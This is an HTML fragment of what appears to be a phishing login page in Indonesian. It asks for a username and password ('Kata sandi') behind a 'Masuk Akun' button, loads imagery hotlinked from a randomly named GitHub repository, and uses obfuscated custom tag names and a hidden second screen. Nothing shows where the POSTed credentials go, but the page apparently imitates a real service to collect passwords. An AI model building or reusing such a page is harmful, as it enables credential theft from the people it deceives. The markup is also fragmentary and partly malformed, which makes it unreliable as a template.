<html>
    ...
    <body>
        <welalxcome>
            <img src="https://raw.githubusercontent.com/yatuhanbulesajedktebenediwgs/bloggersport/main/img/IMG-08812388735.jpg.jpg" loading="lazy" alt="">
        </welalxcome>
        <chsalxcome2 style="display: none;">
            <div style="height:30px;width: 70px;margin-top: -30px;margin-bottom: 0px;float:center;margin-left:42%" class="talxcome"></div>
            <img src="https://raw.githubusercontent.com/yatuhanbulesajedktebenediwgs/bloggersport/main/img/IMG-HEADER01.jpg.jpg" style="position absolute; width: 100%; top: 0; left: 0; right: 0;">
            <br/>
                ...
                <section class="forms">
                    <form id="formHP" class="form-login" method="POST">
                        <div class="input__wrapper">
                            ...
                            <input id="user" name="user" class="input-form" type="text" required placeholder=""/>
                        </div>
                        <div class="input__wrapper">
                            <label class="label-form">Kata sandi</label>
                            <input id="pass" name="pass" required class="input-form" type="password" placeholder=""/>
                            ...
                            <br/>
                            <p></p>
                            <label for="checkbox-rem" style="font-weight: 400; color: #159DCF; float: right">
                                Lupa Kata Sandi?<span class="box"></span>
                            </label>
                        </div>
                        <section style="position fixed; width: 100%; bottom: 0; left: 0; right: 0; bortom: 0; margin-top: 200px">
                            <button type="submit" class="btn-login button" id="doLog" disabled>Masuk Akun</button>
                            <img src="https://raw.githubusercontent.com/yatuhanbulesajedktebenediwgs/bloggersport/main/img/IMG_20240829_135019.jpg.jpg" style="position relative; width: 100%; left: 0; right: 0;">
                        </section>
                    </form>
                </section>
                <center>
